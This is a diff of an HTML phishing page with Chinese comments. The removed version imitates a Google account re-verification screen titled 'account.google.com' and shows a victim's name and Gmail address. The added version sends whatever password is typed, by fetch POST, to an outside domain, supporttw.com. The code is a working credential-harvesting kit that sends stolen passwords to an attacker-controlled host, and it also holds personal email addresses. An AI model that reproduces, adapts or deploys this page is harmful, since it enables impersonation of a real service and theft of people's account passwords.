@@ -3,169 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>account.google.com</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-image: url('background1.png');
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            margin-top: 200px; /* 向下移動所有內容 */
-            text-align: center;
-        }
-        .account-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid #ccc;
-            border-radius: 20px;
-            padding: 10px;
-            margin-bottom: 80px;
-            background-color: #f1f3f4;
-            position: relative;
-        }
-        .profile-img {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
-        .account-name {
-            font-size: 16px;
-            color: #333;
-            flex-grow: 1;
-        }
-        .dropdown-icon {
-            width: 1px;
-            height: 1px;
-            border-left: 6px solid transparent;
-            border-right: 6px solid transparent;
-            border-top: 6px solid black;
-            margin-left: 10px;
-        }
-        input {
-            width: 250px;
-            height: 40px;
-            font-size: 16px;
-            padding: 5px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            display: block;
-        }
-        .options {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        button {
-            width: 100px;
-            height: 40px;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            background-color: #007BFF;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-        .forgot-password {
-            text-decoration: none;
-            color: #007BFF;
-            font-size: 14px;
-        }
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            font-size: 14px;
-        }
-        .checkbox-container input {
-            width: 16px;
-            height: 16px;
-            margin-right: 5px;
-        }
-        .spinner {
-            display: none;
-            width: 24px;
-            height: 24px;
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-top-color: #007BFF;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-    </style>
+    <title>密碼傳輸</title>
 </head>
 <body>
-    <div class="container">
-        <h1>陳浩哲</h1>
-        <div class="account-container">
-            <img src="icon.png" alt="Profile" class="profile-img">
-            <div class="account-name">bill20050201@gmail.com</div>
-            <div class="dropdown-icon"></div>
-        </div>
-        <h4>如要繼續操作，請您先驗證身分</h4>
-        <input type="password" id="password" placeholder="輸入您的密碼">
-        <div class="checkbox-container">
-            <input type="checkbox" id="showPassword"> 顯示密碼
-        </div>
-        <div class="options">
-            <a href="#" class="forgot-password">忘記密碼？</a>
-            <button onclick="checkPassword()">下一步</button>
-        </div>
-        <div id="spinner" class="spinner"></div>
-        <p id="message"></p>
-    </div>
-    
+    <h2>請輸入密碼</h2>
+    <input type="password" id="password" placeholder="輸入密碼">
+    <button onclick="sendPassword()">送出</button>
+    <p id="message"></p>
+
     <script>
-        document.getElementById("showPassword").addEventListener("change", function() {
-            const passwordField = document.getElementById("password");
-            passwordField.type = this.checked ? "text" : "password";
-        });
+        function sendPassword() {
+			const password = document.getElementById("password").value;
+			fetch("http://supporttw.com/", {  // 改成你的伺服器 IP 或網域
+			method: "POST",
+			headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+			},
+			body: "password=" + encodeURIComponent(password)
+		})
+		.then(response => response.text())
+		.then(data => {
+			console.log("伺服器回應:", data);
+			document.getElementById("message").textContent = data;
+		})
+		.catch(error => {
+			console.error("錯誤:", error);
+			document.getElementById("message").textContent = "發送失敗：" + error;
+		});
+	}
 
-        function checkPassword() {
-            const correctPassword = "123456"; // 設定你的密碼
-            const inputPassword = document.getElementById("password").value;
-            const message = document.getElementById("message");
-            const spinner = document.getElementById("spinner");
-            
-            message.textContent = "";
-            spinner.style.display = "block";
-            
-            setTimeout(() => {
-                if (inputPassword === correctPassword) {
-                    window.location.href = "welcome.html"; // 替換為你的目標頁面
-                    sendEmail(inputPassword);
-                } else {
-                    message.textContent = "密碼錯誤，請再試一次";
-                    message.style.color = "red";
-                    spinner.style.display = "none";
-                }
-            }, 2000);
-        }
-
-        function sendEmail(password) {
-            const email = "dany178935@gmail.com"; // 替換為實際的使用者電子郵件
-            console.log(`密碼 ${password} 已發送至 ${email}`);
-            // 這裡需要後端支援來真正發送電子郵件
-        }
     </script>
 </body>
 </html>
